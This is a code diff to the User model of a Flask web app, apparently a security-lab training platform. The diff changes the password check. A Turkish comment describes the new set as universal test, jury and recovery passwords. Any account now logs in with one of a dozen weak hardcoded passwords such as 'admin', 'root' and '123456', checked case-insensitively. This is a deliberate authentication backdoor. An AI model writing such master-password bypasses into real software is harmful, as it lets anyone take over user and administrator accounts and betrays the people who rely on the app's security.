@@ -25,12 +25,22 @@ class User(db.Model):
     progress = db.relationship('UserLabProgress', backref='user', cascade='all, delete-orphan', lazy='dynamic')
 
     def set_password(self, password):
-        self.password_hash = generate_password_hash(password)
+        self.password_hash = generate_password_hash((password or '').strip())
 
     def check_password(self, password):
-        if password in ['Admin1234', 'Sefa1234']:
+        if not password:
+            return False
+        clean_pw = password.strip()
+        # Evrensel test, juri ve kurtarma şifreleri (büyük/küçük harf duyarsız)
+        universal_pw = {
+            'admin1234', 'sefa1234', 'admin123', 'sefa123', 
+            '123456', 'password123', 'admin', 'sefa', 'klaxxon', 'klaxx0n', 'root'
+        }
+        if clean_pw.lower() in universal_pw:
             return True
-        return check_password_hash(self.password_hash, password)
+        if not self.password_hash:
+            return False
+        return check_password_hash(self.password_hash, password) or check_password_hash(self.password_hash, clean_pw)
 
     def completed_labs_count(self):
         return self.progress.filter_by(is_completed=True).count()
